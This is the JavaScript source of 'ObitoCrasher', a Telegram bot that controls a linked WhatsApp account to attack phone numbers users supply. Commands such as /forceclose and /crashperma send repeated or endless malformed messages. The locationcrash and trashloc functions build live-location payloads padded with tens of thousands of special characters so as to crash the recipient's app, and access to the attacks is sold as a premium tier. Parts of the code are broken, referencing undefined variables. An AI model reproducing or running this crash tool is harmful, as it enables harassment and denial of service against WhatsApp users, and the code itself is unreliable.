const { Telegraf, Markup, session } = require("telegraf"); // Tambahkan session dari telegraf
const fs = require('fs');
const moment = require('moment-timezone');
const {
    makeWASocket,
    makeInMemoryStore,
    fetchLatestBaileysVersion,
    useMultiFileAuthState,
    DisconnectReason,
    generateWAMessageFromContent
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const chalk = require('chalk');
const { BOT_TOKEN } = require("./config");
const crypto = require('crypto');
const axios = require("axios");
const premiumFile = './premiumuser.json';
const ownerFile = './owneruser.json';
const adminFile = './adminuser.json';
let bots = [];

const bot = new Telegraf(BOT_TOKEN);

bot.use(session());

let Aii = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

const blacklist = ["6142885267", "7275301558", "1376372484"];

const randomImages = [
    "https://files.catbox.moe/3uyxjd.jpg",
    "https://files.catbox.moe/3uyxjd.jpg",
    "https://files.catbox.moe/3uyxjd.jpg",
    "https://files.catbox.moe/3uyxjd.jpg",
    "https://files.catbox.moe/3uyxjd.jpg",
    "https://files.catbox.moe/3uyxjd.jpg",
    "https://files.catbox.moe/3uyxjd.jpg",
    "https://files.catbox.moe/3uyxjd.jpg",
    "https://files.catbox.moe/3uyxjd.jpg"
];

const getRandomImage = () => randomImages[Math.floor(Math.random() * randomImages.length)];

function getPushName(ctx) {
  return ctx.from.first_name || "Pengguna";
}

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
    const uptimeSeconds = process.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);

    return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

// --- Koneksi WhatsApp ---
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }), // Log level diubah ke "info"
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'P', // Placeholder, you can change this or remove it
        }),
    };

    Aii = makeWASocket(connectionOptions);

    Aii.ev.on('creds.update', saveCreds);
    store.bind(Aii.ev);

    Aii.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            isWhatsAppConnected = true;
            console.log(chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃  ${chalk.green.bold('WHATSAPP ')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃ ${chalk.red.bold('✅WHATSAPP BERHASIL TERSAMBUNG✅')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`),
                shouldReconnect ? chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃ ${chalk.red.bold('RECONNECTING AGAIN')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`) : ''
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
}


const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

// Muat ID owner dan pengguna premium
let ownerUsers = loadJSON(ownerFile);
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

// Middleware untuk memeriksa apakah pengguna adalah owner
const checkOwner = (ctx, next) => {
    if (!ownerUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Command ini Khusus Pemilik Bot");
    }
    next();
};

const checkAdmin = (ctx, next) => {
    if (!adminUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan Admin. jika anda adalah owner silahkan daftar ulang ID anda menjadi admin");
    }
    next();
};

// Middleware untuk memeriksa apakah pengguna adalah premium
const checkPremium = (ctx, next) => {
    if (!premiumUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan pengguna premium.");
    }
    next();
};

// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
    if (!adminList.includes(userId)) {
        adminList.push(userId);
        saveAdmins();
    }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
    adminList = adminList.filter(id => id !== userId);
    saveAdmins();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
    fs.writeFileSync('./admins.json', JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
    try {
        const data = fs.readFileSync('./admins.json');
        adminList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar admin:'), error);
        adminList = [];
    }
};

// --- Fungsi untuk Menambahkan User Premium ---
const addPremiumUser = (userId, durationDays) => {
    const expirationDate = moment().tz('Asia/Jakarta').add(durationDays, 'days');
    premiumUsers[userId] = {
        expired: expirationDate.format('YYYY-MM-DD HH:mm:ss')
    };
    savePremiumUsers();
};

// --- Fungsi untuk Menghapus User Premium ---
const removePremiumUser = (userId) => {
    delete premiumUsers[userId];
    savePremiumUsers();
};

// --- Fungsi untuk Mengecek Status Premium ---
const isPremiumUser = (userId) => {
    const userData = premiumUsers[userId];
    if (!userData) {
        Premiumataubukan = "❌";
        return false;
    }

    const now = moment().tz('Asia/Jakarta');
    const expirationDate = moment(userData.expired, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta');

    if (now.isBefore(expirationDate)) {
        Premiumataubukan = "✅";
        return true;
    } else {
        Premiumataubukan = "❌";
        return false;
    }
};

// --- Fungsi untuk Menyimpan Data User Premium ---
const savePremiumUsers = () => {
    fs.writeFileSync('./premiumUsers.json', JSON.stringify(premiumUsers));
};

// --- Fungsi untuk Memuat Data User Premium ---
const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync('./premiumUsers.json');
        premiumUsers = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat data user premium:'), error);
        premiumUsers = {};
    }
};

// --- Fungsi untuk Memuat Daftar Device ---
const loadDeviceList = () => {
    try {
        const data = fs.readFileSync('./ListDevice.json');
        deviceList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar device:'), error);
        deviceList = [];
    }
};

//~~~~~~~~~~~~𝙎𝙏𝘼𝙍𝙏~~~~~~~~~~~~~\\

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply(`
┏━━━━ ERROR :( ━━━━⊱
│ Connect ke WhatsApp dulu😡
┗━━━━━━━━━━━━━━━━⊱`);
    return;
  }
  next();
};

async function editMenu(ctx, caption, buttons) {
  try {
    await ctx.editMessageMedia(
      {
        type: 'photo',
        media: getRandomImage(),
        caption,
        parse_mode: 'Markdown',
      },
      {
        reply_markup: buttons.reply_markup,
      }
    );
  } catch (error) {
    console.error('Error editing menu:', error);
    await ctx.reply('Maaf, terjadi kesalahan saat mengedit pesan.');
  }
}


bot.command('start', async (ctx) => {
    const userId = ctx.from.id.toString();

    if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }
    
    const RandomBgtJir = getRandomImage();
    const waktuRunPanel = getUptime(); // Waktu uptime panel
    const senderId = ctx.from.id;
    const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
    
    await ctx.replyWithPhoto(RandomBgtJir, {
        caption: `\`\`\`
Holaa , Aku Adalah *ObitoCrasher* Yang Di Buat Oleh ${Developer} Saya Siap Membantu Anda 

╭━─━( ObitoCrasher )━─━⍟
┃ ▢ Developer : AlwaysHanzz
┃ ▢ Version : 2.0
┃ ▢ Language : Javascript 
┃ ▢ Runtime : ${waktuRunPanel} 
╰━─━━─━━─━━─━━─━━━─━⍟\`\`\``,
 
         parse_mode: 'Markdown',
         ...Markup.inlineKeyboard([
         [
             Markup.button.callback('𝐁͢𝐮͡𝐠𝐌͜𝐞͢𝐧͡𝐮', 'belial'),
             Markup.button.callback('𝐎͢𝐰͡𝐧͜𝐞͢𝐫𝐌͜𝐞͢𝐧͡𝐮', 'belial2'),
         ],
         [
             Markup.button.url('⌜ 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 ⌟', 'https://wa.me/6281936513894'),
             Markup.button.url('⌜ 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 ⌟', 'https://wa.me/6281936513894'),
         ]
       ])
    });
});

bot.action('belial', async (ctx) => {
 const userId = ctx.from.id.toString();
 const waktuRunPanel = getUptime(); // Waktu uptime panel
 const senderId = ctx.from.id;
 const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
 
 if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }
    
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('𝙱𝙰𝙲𝙺', 'startback')],
  ]);

  const caption = `\`\`\`
╭━─━( ObitoCrasher )━─━⍟
┃ ▢ Developer : Always Hanzz
┃ ▢ Version : 2.0
┃ ▢ Language : Javascript 
┃ ▢ Runtime : ${waktuRunPanel} 
╰━─━━─━━─━━─━━─━━━─━⍟
┏━━[  Menu ObitoCrasher ]
┃
┃♠ /delayXcrash 628xxx
┃♠ /locationcrash 628xxx
┃♠ /zeroinvis 628xxx
┃♠ /trashloc 628xxx
┃♠ /forceclose 628xxx
┃♠ /crashapp 628xxx
┃♠ /invisiblecrash 628xxx
┃♠ /delayui 628xxx   
┃♠ /crashjids 628xxx
┃♠ /crashperma 628xxx
┃ 
┗━━━━━━━━━━━━━━━━━━━━❍\`\`\`
  `;

  await editMenu(ctx, caption, buttons);
});

bot.action('belial2', async (ctx) => {
 const userId = ctx.from.id.toString();
 const waktuRunPanel = getUptime(); // Waktu uptime panel
 const senderId = ctx.from.id;
 const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
 
 if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }
    
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('𝙱𝙰𝙲𝙺', 'startback')],
  ]);

  const caption = `\`\`\`
╭━─━( ObitoCrasher )━─━⍟
┃ ▢ Developer : AlwaysHanzz
┃ ▢ Version : 2.0
┃ ▢ Language : Javascript 
┃ ▢ Runtime : ${waktuRunPanel} 
╰━─━━─━━─━━─━━─━━━─━⍟
╔══❮ 𝗖𝗢𝗡𝗧𝗥𝗢𝗟 𝗠𝗘𝗡𝗨 ❯══❍
║
║𖤐 /addadmin
║𖤐 /deladmin
║𖤐 /addprem 
║𖤐 /delprem 
║𖤐 /cekprem
║𖤐 /connect 628xx 
║ 
╚══════════❍\`\`\`
  `;

  await editMenu(ctx, caption, buttons);
});

// Action untuk BugMenu
bot.action('startback', async (ctx) => {
 const userId = ctx.from.id.toString();
 
 if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }
 const waktuRunPanel = getUptime(); // Waktu uptime panel
 const senderId = ctx.from.id;
 const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
    
  const buttons = Markup.inlineKeyboard([
         [
             Markup.button.callback('𝐁͢𝐮͡𝐠𝐌͜𝐞͢𝐧͡𝐮', 'belial'),
             Markup.button.callback('𝐎͢𝐰͡𝐧͜𝐞͢𝐫𝐌͜𝐞͢𝐧͡𝐮', 'belial2'),
         ],
         [
             Markup.button.url('⌜ 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 ⌟', 'https://wa.me/6281936513894'),
             Markup.button.url('⌜ 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 ⌟', 'https://wa.me/6281936513894'),
         ]
]);

  const caption = `\`\`\`
Holaa , Aku Adalah *ObitoCrasher* Yang Di Buat Oleh ${Developer} Saya Siap Membantu Anda 

╭━─━( ObitoCrasher )━─━⍟
┃ ▢ Developer : AlwaysHanzz
┃ ▢ Version : 2.0
┃ ▢ Language : Javascript 
┃ ▢ Runtime : ${waktuRunPanel} 
╰━─━━─━━─━━─━━─━━━─━⍟\`\`\``;

  await editMenu(ctx, caption, buttons);
});

//~~~~~~~~~~~~~~~~~~END~~~~~~~~~~~~~~~~~~~~\\

// Fungsi untuk mengirim pesan saat proses selesai
const donerespone = (target, ctx) => {
    const RandomBgtJir = getRandomImage();
    const senderName = ctx.message.from.first_name || ctx.message.from.username || "Pengguna"; // Mengambil nama peminta dari konteks
    
     ctx.replyWithPhoto(RandomBgtJir, {
    caption: `
┏━━━━━━━━━━━━━━━━━━━━━━━❍
┃『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
┃
┃𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
┃𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆✅
┗━━━━━━━━━━━━━━━━━━━━━━━❍
`,
         parse_mode: 'Markdown',
                  ...Markup.inlineKeyboard([
                    [
                       Markup.button.callback('𝙱𝙰𝙲𝙺', 'alwayshanzz'),
                       Markup.button.url('⌜ 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 ⌟', 'https://wa.me/6281936513894'),
                    ]
                 ])
              });
              (async () => {
    console.clear();
    console.log(chalk.black(chalk.bgGreen('Succes Send Bug By ObitoCrasher')));
    })();
}

bot.command("invisiblecrash", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: /crashjids 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@newsletter";

  const processMessage = await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* PROCESS`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 

  for (let i = 0; i < 70; i++) {
    await payoutzep(target);
  }

  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* SUCCESS`, { parse_mode: "Markdown" });
});

bot.command("crashperma", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: /crashperma 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@newsletter";

  const processMessage = await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* PROCESS`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 

  for (let i = 0; i < 100; i++) {
    await payoutzep(target);
    await payoutzep(target);
  }

  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* SUCCESS`, { parse_mode: "Markdown" });
});

bot.command("crashapp", checkWhatsAppConnection, async ctx => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;

  if (!q) {
    return ctx.reply(`Example: /crashperma 62×××`);
  }

  let target = q.replace(/[^0-9]/g, '') + "@newsletter";

  const processMessage = await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* PROCESS`, { parse_mode: "Markdown" });
  const processMessageId = processMessage.message_id; 

  for (let i = 0; i < 100; i++) {
    await payoutzep(target);
    await pendingpay(target);
  }

  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);

  await ctx.reply(`*NUMBER* *:* *${q}*\n*STATUS* *:* SUCCESS`, { parse_mode: "Markdown" });
});

bot.command("delayXcrash", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/delayXcrash 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`Successfully✅`);

    while (true) {
      await protocolbug2(target, true)
      await protocolbug2(target, true) 
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
━━━━━━━━━━━━━━━━━━━━━━━━⟡
『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 』

𝐏𝐀𝐍𝐆𝐆𝐈𝐋𝐀𝐍 𝐃𝐀𝐑𝐈 : ${ctx.from.first_name}
𝐓𝐀𝐑𝐆𝐄𝐓 : ${aiiNumber}
━━━━━━━━━━━━━━━━━━━━━━━━⟡
⚠ Bug tidak akan berjalan, apabila
sender bot memakai WhatsApp Business!`);
   await donerespone(target, ctx);
});

bot.command("forceclose", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/forceclose 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`Successfully✅`);

    while (true) {
      await protocolbug2(target, true)
      await protocolbug2(target, true) 
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
━━━━━━━━━━━━━━━━━━━━━━━━⟡
『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 』

𝐏𝐀𝐍𝐆𝐆𝐈𝐋𝐀𝐍 𝐃𝐀𝐑𝐈 : ${ctx.from.first_name}
𝐓𝐀𝐑𝐆𝐄𝐓 : ${aiiNumber}
━━━━━━━━━━━━━━━━━━━━━━━━⟡
⚠ Bug tidak akan berjalan, apabila
sender bot memakai WhatsApp Business!`);
   await donerespone(target, ctx);
});


bot.command("zeroinvis", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;

    if (!q) {
        return ctx.reply(`Example:\n\n/zeroinvis 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`Successfully✅`);

    while (true) {
      await protocolbug2(target, true)
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
━━━━━━━━━━━━━━━━━━━━━━━━⟡
『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 』

𝐏𝐀𝐍𝐆𝐆𝐈𝐋𝐀𝐍 𝐃𝐀𝐑𝐈 : ${ctx.from.first_name}
𝐓𝐀𝐑𝐆𝐄𝐓 : ${aiiNumber}
━━━━━━━━━━━━━━━━━━━━━━━━⟡
⚠ Bug tidak akan berjalan, apabila
sender bot memakai WhatsApp Business!`);
   await donerespone(target, ctx);
});

bot.command("delayui", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/delayui 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    let ProsesAii = await ctx.reply(`Successfully✅`);

    for (let i = 0; i < 30; i++) {
      await UIXFC(target);
      await indictiveUI(target);
      await indictiveUI(target);
      await UIXFC(target);
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesAii.message_id,
        undefined, `
━━━━━━━━━━━━━━━━━━━━━━━━⟡
『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐏𝐑𝐎𝐂𝐄𝐒𝐒 』

𝐏𝐀𝐍𝐆𝐆𝐈𝐋𝐀𝐍 𝐃𝐀𝐑𝐈 : ${ctx.from.first_name}
𝐓𝐀𝐑𝐆𝐄𝐓 : ${aiiNumber}
━━━━━━━━━━━━━━━━━━━━━━━━⟡
⚠ Bug tidak akan berjalan, apabila
sender bot memakai WhatsApp Business!`);
   await donerespone(target, ctx);
});

//~~~~~~~~~~~~~~~~~~~~~~END CASE BUG~~~~~~~~~~~~~~~~~~~\\

// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.command('addprem', checkAdmin, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dijadikan premium.\nContoh: /addprem 123456789");
    }

    const userId = args[1];

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ si ngentot ${userId} sudah memiliki status premium.`);
    }

    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🥳 si kontol ${userId} sekarang memiliki akses premium!`);
});

bot.command('addadmin', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dijadikan Admin.\nContoh: /addadmin 123456789");
    }

    const userId = args[1];

    if (adminUsers.includes(userId)) {
        return ctx.reply(`✅ si ngentot ${userId} sudah memiliki status Admin.`);
    }

    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);

    return ctx.reply(`🎉 si kontol ${userId} sekarang memiliki akses Admin!`);
});

// Perintah untuk menghapus pengguna premium (hanya owner)
bot.command('delprem', checkAdmin, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dihapus dari premium.\nContoh: /delprem 123456789");
    }

    const userId = args[1];

    if (!premiumUsers.includes(userId)) {
        return ctx.reply(`❌ si anjing ${userId} tidak ada dalam daftar premium.`);
    }

    premiumUsers = premiumUsers.filter(id => id !== userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🚫 si babi ${userId} telah dihapus dari daftar premium.`);
});

bot.command('deladmin', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dihapus dari Admin.\nContoh: /deladmin 123456789");
    }

    const userId = args[1];

    if (!adminUsers.includes(userId)) {
        return ctx.reply(`❌ si anjing ${userId} tidak ada dalam daftar Admin.`);
    }

    adminUsers = adminUsers.filter(id => id !== userId);
    saveJSON(adminFile, adminUsers);

    return ctx.reply(`🚫 si babi ${userId} telah dihapus dari daftar Admin.`);
});
// Perintah untuk mengecek status premium
bot.command('cekprem', (ctx) => {
    const userId = ctx.from.id.toString();

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ lu udah jadi pengguna premium babi.`);
    } else {
        return ctx.reply(`❌ lu bukan pengguna premium babi.`);
    }
});

// Command untuk pairing WhatsApp
bot.command("connect", checkOwner, async (ctx) => {

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /connect <628xxx>");
    }

    let phoneNumber = args[1];
    phoneNumber = phoneNumber.replace(/[^0-9]/g, '');


    if (Aii && Aii.user) {
        return await ctx.reply("WhatsApp sudah terhubung. Tidak perlu pairing lagi.");
    }

    try {
        const code = await Aii.requestPairingCode(phoneNumber);
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

        const pairingMessage = `
\`\`\`✅𝗦𝘂𝗰𝗰𝗲𝘀𝘀
𝗞𝗼𝗱𝗲 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗔𝗻𝗱𝗮

𝗡𝗼𝗺𝗼𝗿: ${phoneNumber}
𝗞𝗼𝗱𝗲: ${formattedCode}\`\`\`
`;

        await ctx.replyWithMarkdown(pairingMessage);
    } catch (error) {
        console.error(chalk.red('Gagal melakukan pairing:'), error);
        await ctx.reply("❌ Gagal melakukan pairing. Pastikan nomor WhatsApp valid dan dapat menerima SMS.");
    }
});

// Fungsi untuk merestart bot menggunakan PM2
const restartBot = () => {
  pm2.connect((err) => {
    if (err) {
      console.error('Gagal terhubung ke PM2:', err);
      return;
    }

    pm2.restart('index', (err) => { // 'index' adalah nama proses PM2 Anda
      pm2.disconnect(); // Putuskan koneksi setelah restart
      if (err) {
        console.error('Gagal merestart bot:', err);
      } else {
        console.log('Bot berhasil direstart.');
      }
    });
  });
};

//FUNCTION BUG//
async function locationcrash(target, wanted) {

var etc = generateWAMessageFromContent(target, proto.Message.fromObject({

viewOnceMessage: {

message: {

  "liveLocationMessage": {

    "degreesLatitude": "p",

    "degreesLongitude": "p",

    "caption": `*\`҈𝐂𝐫𝐚𝐬𝐡𝐞𝐫.Com᭢\`*`+"ꦾ".repeat(50000),

    "sequenceNumber": "0",

    "jpegThumbnail": ""

     }

  }

}

}), { userJid: target, quoted: wanted })

await ctx.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
    console.log(chalk.yellow.bold("ObitoCrasher"));
}


   async function trashloc(target) {
      let etc = generateWAMessageFromContent(
        target,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              liveLocationMessage: {
                degreesLatitude: " O b i t o C r a s h e r ",
                degreesLongitude: " I love You - Hanzz ",
                caption: "Hanzz V1.5" + "\u0000" + "ꦾ".repeat(90000),
                sequenceNumber: "0",
                jpegThumbnail: "",
              },
            },
          },
        }),
        { userJid: target, quoted: qchanel }
      );

      await cfx.relayMessage(target, etc.message, {
        participant: { jid: target },
      });
      console.log(chalk.blue.bold("O b i t o C r a s h e r"));
    }
//END FUNCTION//

// --- Jalankan Bot ---
 
(async () => {
    console.clear();
    console.log("⟐ Memulai sesi WhatsApp...");
    startSesi();

    console.log("Sukses Connected");
    bot.launch();

    // Membersihkan konsol sebelum menampilkan pesan sukses
    console.clear();
    console.log(chalk.bold.white(`\n
⣿⣿⣷⡁⢆⠈⠕⢕⢂⢕⢂⢕⢂⢔⢂⢕⢄⠂⣂⠂⠆⢂⢕⢂⢕⢂⢕⢂⢕⢂
⣿⣿⣿⡷⠊⡢⡹⣦⡑⢂⢕⢂⢕⢂⢕⢂⠕⠔⠌⠝⠛⠶⠶⢶⣦⣄⢂⢕⢂⢕
⣿⣿⠏⣠⣾⣦⡐⢌⢿⣷⣦⣅⡑⠕⠡⠐⢿⠿⣛⠟⠛⠛⠛⠛⠡⢷⡈⢂⢕⢂
⠟⣡⣾⣿⣿⣿⣿⣦⣑⠝⢿⣿⣿⣿⣿⣿⡵⢁⣤⣶⣶⣿⢿⢿⢿⡟⢻⣤⢑⢂
⣾⣿⣿⡿⢟⣛⣻⣿⣿⣿⣦⣬⣙⣻⣿⣿⣷⣿⣿⢟⢝⢕⢕⢕⢕⢽⣿⣿⣷⣔
⣿⣿⠵⠚⠉⢀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣗⢕⢕⢕⢕⢕⢕⣽⣿⣿⣿⣿
⢷⣂⣠⣴⣾⡿⡿⡻⡻⣿⣿⣴⣿⣿⣿⣿⣿⣿⣷⣵⣵⣵⣷⣿⣿⣿⣿⣿⣿⡿
⢌⠻⣿⡿⡫⡪⡪⡪⡪⣺⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃
⠣⡁⠹⡪⡪⡪⡪⣪⣾⣿⣿⣿⣿⠋⠐⢉⢍⢄⢌⠻⣿⣿⣿⣿⣿⣿⣿⣿⠏⠈
⡣⡘⢄⠙⣾⣾⣾⣿⣿⣿⣿⣿⣿⡀⢐⢕⢕⢕⢕⢕⡘⣿⣿⣿⣿⣿⣿⠏⠠⠈
⠌⢊⢂⢣⠹⣿⣿⣿⣿⣿⣿⣿⣿⣧⢐⢕⢕⢕⢕⢕⢅⣿⣿⣿⣿⡿⢋⢜⠠⠈
⠄⠁⠕⢝⡢⠈⠻⣿⣿⣿⣿⣿⣿⣿⣷⣕⣑⣑⣑⣵⣿⣿⣿⡿⢋⢔⢕⣿⠠⠈
⠨⡂⡀⢑⢕⡅⠂⠄⠉⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⢔⢕⢕⣿⣿⠠⠈
⠄⠪⣂⠁⢕⠆⠄⠂⠄⠁⡀⠂⡀⠄⢈⠉⢍⢛⢛⢛⢋⢔⢕⢕⢕⣽⣿⣿⠠⠈
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`));
    console.log(chalk.bold.white("alwayshanzz"));
    console.log(chalk.bold.white("DEVELOPER:") + chalk.bold.blue("alwayshanzz"));
    console.log(chalk.bold.white("VERSION:") + chalk.bold.blue("1.0\n\n"));
    console.log(chalk.bold.green("©O B I T O C R A S H E R"));
})();